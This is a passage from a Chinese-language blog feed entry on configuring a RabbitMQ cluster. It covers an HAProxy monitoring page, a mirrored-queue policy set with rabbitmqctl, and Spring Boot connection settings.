stats</span><br><span class="line">    bind *:8100</span><br><span class="line">    mode http</span><br><span class="line">    option httplog</span><br><span class="line">    stats enable</span><br><span class="line">    # 设置 haproxy 监控地址为：http:&#x2F;&#x2F;localhost:8100&#x2F;rabbitmq-stats</span><br><span class="line">    stats uri &#x2F;rabbitmq-stats</span><br><span class="line">    stats refresh 5s</span><br></pre></td></tr></table></figure><p><strong>启动 haproxy</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">haproxy -f /etc/haproxy/haproxy.cfg</span><br><span class="line">systemctl restart haproxy</span><br></pre></td></tr></table></figure><p>访问 <a href="http://192.168.174.13:8100/rabbitmq-stats" target="_blank" rel="noopener">http://192.168.174.13:8100/rabbitmq-stats</a> 可以看到状态</p><blockquote><p><a href="/back-end/linux/lb-ha/">Keepalived 安装参考</a></p></blockquote><h2 id="集群镜像模式配置"><a href="#集群镜像模式配置" class="headerlink" title="集群镜像模式配置"></a>集群镜像模式配置</h2><p>使用Rabbit镜像功能，需要基于rabbitmq策略来实现，策策是用来控制和修改群集范围的某个vhost队列行为和Exchange行为在cluster中任意节点启用策略，策略会自动同步到集群节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这行命令在vhost名称为hrsystem创建了一个策略，策略名称为ha-allqueue,策略模式为 all 即复制到所有节点，包含新增节点， 策略正则表达式为 “^” 表示所有匹配所有队列名称。</span></span><br><span class="line"><span class="comment"># 例如 rabbitmqctl set_policy -p hrsystem ha-allqueue "^message" '&#123;"ha-mode":"all"&#125;'</span></span><br><span class="line"><span class="comment"># 注意："^message" 这个规则要根据自己修改，这个是指同步"message"开头的队列名称，我们配置时使用的应用于所有队列，所以表达式为"^"</span></span><br><span class="line">rabbitmqctl set_policy -p hrsystem ha-allqueue<span class="string">"^"</span> <span class="string">'&#123;"ha-mode":"all"&#125;'</span></span><br></pre></td></tr></table></figure><p>set_policy 说明参见</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_policy [-p vhostpath] &#123;name&#125; &#123;pattern&#125; &#123;definition&#125; [priority]      <span class="comment"># ha-mode:all、exactly、nodes</span></span><br></pre></td></tr></table></figure><p>也可以通过rabbit控制台添加</p><p><img src="/images/docker/docker-rabbitmq/10.jpg" alt="10"></p><p>创建队列时需要指定ha 参数，如果不指定x-ha-prolicy 的话将无法复制</p><p>客户端使用负载服务器发送消息，队列会被复制到所有节点，当然策略也可以配置制定某几个节点，这时任何节点故障 、或者重启将不会影响我们正常使用某个队列，到这里我们完成了高可用配置。</p><h2 id="Spring-Boot-应用连接-RabbitMQ-集群配置"><a href="#Spring-Boot-应用连接-RabbitMQ-集群配置" class="headerlink" title="Spring Boot 应用连接 RabbitMQ 集群配置"></a>Spring Boot 应用连接 RabbitMQ 集群配置</h2><p>引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">spring.rabbitmq.addresses</span>=<span class="string">node1:5672,node2:5672,node3:5672</span></span><br><span class="line"><span class="meta">spring.rabbitmq.username</span>=<span class="string">admin</span></span><br><span class="line"><span class="meta">spring.rabbitmq.password</span>=<span class="string">123456</span></span><br></pre></td></tr></table></figure><blockquote><p>注意，容器需要暴露端口 5672 供外部访问</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RabbitMQ 是一种消息中间件，用于处理来自客户端的异步消息。服务端将要发送的消息放入到队列池中。接收端可以根据RabbitMQ配置的转发机制接收服务端发来的消息。RabbitMQ依据指定的转发规则进行消息的转发、缓冲和持久化操作，主要用在多服务器间或单服务器的子系统间进行通信，是分布式系统标准的配置。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Docker" scheme="https://xinlichao.cn/categories/Docker/"/>
    
    
      <category term="RabbitMQ" scheme="https://xinlichao.cn/tags/RabbitMQ/"/>
    
  </entry>
  
</feed>
